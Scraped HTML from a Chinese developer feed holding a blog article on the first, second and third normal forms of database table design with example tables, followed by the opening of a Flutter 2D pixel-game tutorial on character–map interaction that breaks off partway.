itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一站式了解数据库三大范式(库表设计基础)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    想用offer打牌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:21:54.000Z" title="Tue Dec 16 2025 07:21:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>作为后端开发者，项目初期进行库表设计的时候，如果光凭经验而没有一套合适的方法论，大概率项目最后会变成一个难以维护的“史山”。那么我们就来简单讲讲数据库表设计的三大范式，尽量都让大家听懂，我们的最终目的是大家掌握应对各种业务场景设计的思维框架</p>
</blockquote>
<h2 data-id="heading-1">第一范式</h2>
<p>第一范式：确保关系中的所有属性（列）都是<strong>不可再分</strong>的原子性值。</p>
<p><strong>具体含义：</strong></p>
<ul>
<li>表中的每一个字段都不可再分。</li>
<li>不允许在同一列中存储多个值，例如，一个<code>“联系方式”</code>字段不能包含<code>“电话号码, 电子邮件地址”</code>。</li>
<li>不允许在表中创建“重复组”——即一个记录（行）中不能有多个重复的字段，例如<code>“产品1, 产品2, 产品3”</code></li>
</ul>
<p>举个例子来回答，不允许在同一列中存储多个值：比如说地址这个列，你不能存储成广东省广州市xx区xx街道....这样整个字符串，这样地址还可以再进行拆分，而是你要拆成直到不能再进行拆分的原子字段，比如省，市，区等等。</p>
<p>一个记录（行）中不能有多个重复的字段，比如说课程里面你不能同时记录数学，语文等等，而是应该分开多个行进行记录</p>
<h2 data-id="heading-2">第二范式</h2>
<p>第二范式：要求每一列(非主键字段)都<strong>完全</strong>依赖于主键</p>
<p><strong>具体含义：</strong></p>
<ul>
<li>如果一个表的主键是<strong>联合主键</strong>（由多个列组成），那么所有非主键列都必须依赖于<strong>整个</strong>联合主键。</li>
<li>如果任何一个非主键列只依赖于联合主键中的<strong>部分</strong>列，则违反了 2NF。这会导致“部分函数依赖”。</li>
</ul>
<p>举个例子来解释第二范式，订单表里面就不能出现商品的库存信息，因为商品的库存信息依赖于商品的ID而不依赖于订单ID。那么简单来说就是表里面的每个列都必须完全依赖于主键，不管这个主键是联合主键还是独立主键，不能出现部分依赖的情况，否则就要拆分部分依赖的列到其他表里面去。</p>
<p><strong>再举个违反 2NF 的例子：</strong> （假设 <code>订单ID</code> 和 <code>产品ID</code> 组成联合主键）</p>

































<table><thead><tr><th><strong>订单ID</strong></th><th><strong>产品ID</strong></th><th><strong>订单日期</strong></th><th><strong>产品名称</strong></th><th><strong>产品价格</strong></th></tr></thead><tbody><tr><td>1001</td><td>A101</td><td>2025-12-15</td><td>笔记本电脑</td><td>8000</td></tr><tr><td>1001</td><td>B205</td><td>2025-12-15</td><td>鼠标</td><td>150</td></tr><tr><td>1002</td><td>A101</td><td>2025-12-16</td><td>笔记本电脑</td><td>8000</td></tr></tbody></table>
<p><strong>问题：</strong> <code>产品名称</code> 和 <code>产品价格</code> 只依赖于 <code>产品ID</code> (主键的一部分)，与 <code>订单ID</code> 无关。这就是<strong>部分函数依赖</strong></p>
<h2 data-id="heading-3">第三范式</h2>
<p>第三范式：每一列都必须直接<strong>依赖</strong>于主键而不能间接依赖主键，即<strong>不能存在依赖传递</strong>。换句话说，任何非主键属性不能依赖于其他非主键属性。</p>
<p><strong>具体含义：</strong></p>
<ul>
<li>消除<strong>传递函数依赖</strong>。即如果 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \rightarrow B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> 且 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>→</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">B \rightarrow C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span>（其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 是主键），那么 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span> 对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 就是传递依赖，需要消除</li>
</ul>
<p>举个例子来解释第三范式：订单表里面有用户ID，就不应该还冗余一列用户的注册时间。因为用户的注册时间依赖于用户ID(在订单表里面是非主键,在用户表里面是主键)，所以用户的注册时间如果存在于订单表，就是有间接依赖，即依赖传递的情况。</p>
<p><strong>再举个违反 3NF 的例子：</strong> （假设 <code>客户ID</code> 是主键）</p>





























<table><thead><tr><th><strong>客户ID</strong></th><th><strong>客户姓名</strong></th><th><strong>所在城市</strong></th><th><strong>城市邮编</strong></th></tr></thead><tbody><tr><td>C001</td><td>张三</td><td>上海</td><td>200000</td></tr><tr><td>C002</td><td>李四</td><td>上海</td><td>200000</td></tr><tr><td>C003</td><td>王五</td><td>北京</td><td>100000</td></tr></tbody></table>
<p><strong>问题：</strong> <code>城市邮编</code> 依赖于 <code>所在城市</code>，而 <code>所在城市</code> 依赖于 <code>客户ID</code>。 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>客户</mtext><mi>I</mi><mi>D</mi><mo>→</mo><mtext>所在城市</mtext><mo>→</mo><mtext>城市邮编</mtext></mrow><annotation encoding="application/x-tex">客户ID \rightarrow 所在城市 \rightarrow 城市邮编</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">客户</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">所在城市</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">城市邮编</span></span></span></span></span> 这就是<strong>传递函数依赖</strong>。每次有新的上海客户加入，<code>城市邮编</code> 都会重复存储。</p>
<h2 data-id="heading-4">总结❤️</h2>
<p>在实际的数据库设计中，通常会努力达到 3NF。然而，有时为了<strong>提高查询性能</strong>，可能会<strong>故意违反 3NF</strong>，采用<strong>反范式设计</strong>。为业务做出的妥协是可以理解的</p>
<p>我推荐大家可以利用DDD领域驱动设计的维度去结合三大范式来进行库表设计，比如在订单领域，地址就可以是订单表的列，可以冗余。在用户领域，地址就应该是一个实体，可以进行增删改查和独立的业务意义，有完整的生命周期。简单来说，就是在用户领域，地址应该被设置成一个单独ID的表，而在订单领域，地址只是一个值对象(无生命周期，下单即固化，类似于快照)</p>
<p>什么该冗余，什么不该冗余，有了一个切合实际的思维框架，而不是依赖于"经验"之谈，对项目的可维护性会有很大帮助</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互]]></title>    <link>https://juejin.cn/post/7584014975242911754</link>    <guid>https://juejin.cn/post/7584014975242911754</guid>    <pubDate>2025-12-16T07:24:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584014975242911754" data-draft-id="7583696325142216742" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互"/> <meta itemprop="keywords" content="Flutter,游戏开发,游戏"/> <meta itemprop="datePublished" content="2025-12-16T07:24:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_大学牲"/> <meta itemprop="url" content="https://juejin.cn/user/3125273628517148"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3125273628517148/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _大学牲
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:24:30.000Z" title="Tue Dec 16 2025 07:24:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc59e14866b241688361555ee1e70947~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=7CXkReFqdYXG2D4yEiZKyPW%2Fb3Y%3D" width="100%" loading="lazy"/></p><p/>
<p><a href="https://juejin.cn/post/7579264485259411471" target="_blank" title="https://juejin.cn/post/7579264485259411471">Flutter 勇闯2D像素游戏之路（一）：一个 Hero 的诞生</a><br/>
<a href="https://juejin.cn/post/7581025279646892070" target="_blank" title="https://juejin.cn/post/7581025279646892070">Flutter 勇闯2D像素游戏之路（二）：绘制加载游戏地图</a><br/>
<a href="https://juejin.cn/spost/7584014975242911754" target="_blank" title="https://juejin.cn/spost/7584014975242911754">Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互</a></p>
<h2 data-id="heading-0">前言</h2>
<p>在上篇文章中，我们初识了 <strong>2D 地图编辑器 Tiled</strong>，完成了从 <strong>地图绘制、资源加载</strong> 到 <strong>基础墙体碰撞</strong> 的搭建，为游戏世界奠定了最基本的空间规则。</p>
<p>但仅有 <code>能走、能挡</code> 的地图，还远不足以构成一个真正有生命力的游戏场景。<br/>
真正让地图 <code>活</code> 起来的，是 <strong>人物与地图元素之间的交互</strong>。</p>
<p>在游戏中，地图并不仅仅是静态的背景，它往往承载着多种功能性的元素，例如：</p>
<ul>
<li>可被触发的 <strong>宝箱、机关</strong></li>
<li>控制通行逻辑的 <strong>钥匙与门</strong></li>
<li>带来风险与挑战的 <strong>陷阱、伤害型障碍物</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dbb61d1a0c8429aac51cb7b03f11fec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lCiolOqecoPYfa3nFF9vqLO1Vhw%3D" alt="截屏2025-12-16 13.58.20.png" loading="lazy"/></p>
<p>这些元素都需要与人物产生行为上的联动：<br/>
<strong>接触、判断、反馈、结果</strong>，共同构成完整的交互闭环。</p>
<p>因此，本篇文章将着重于构建 <strong>人物与地图元素的交互</strong> ，逐步 <strong>介绍、实现</strong> 几类常见的地图交互对象，构建一个更加丰富、可扩展的地图交互体系。</p>
<h3 data-id="heading-1">前情提示</h3>
<h4 data-id="heading-2">1. 地图</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ceaac4c66a3348c7885fd3c0de868d8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lc0X076tyX4XmZd%2FWYZNjGeVwzM%3D" width="100%" loading="lazy"/>
<p>在进行本章的内容实践之前，请先将之前地图中 <strong>门、宝箱、钥匙、地刺元素</strong> 先行清除。<br/>
本章将把他们从单纯装饰件，进化到真正的可交互件。</p>
<blockquote>
<p>接下来所需要用到的 <strong>门、宝箱、钥匙、地刺</strong> 等图片素材，已在 <strong>github仓库</strong> 中添加。</p>
</blockquote>
<h4 data-id="heading-3">2. 墙体</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09af254d3786466dad783d6a18c6e010~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=PK8twXdE%2FrnqpkiwovStFoGFy8U%3D" alt="截屏2025-12-16 14.18.55.png" loading="lazy"/></p>
<p>首先，先感谢兄弟的反馈 😊<br/>
接下来我们就用 <strong>Object Layer</strong> 和 <strong>Tile Layer</strong> 实现上一期的墙体碰撞区，看看区别。</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b02b4357c85a496b93fd98cfb229fce6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=6ra5QiLhfJM25Q3aIp4qaiqHeqg%3D" width="100%" loading="lazy"/>
<p align="center"><i>Object Layer</i></p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91870250637a4e74972dca03c541812f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=WulaVqMQ%2FupsMfeaWKx9SUta1io%3D" width="100%" loading="lazy"/>
<p align="center"><i>Tile Layer</i></p>
<p>从图中可以看到：</p>
<ul>
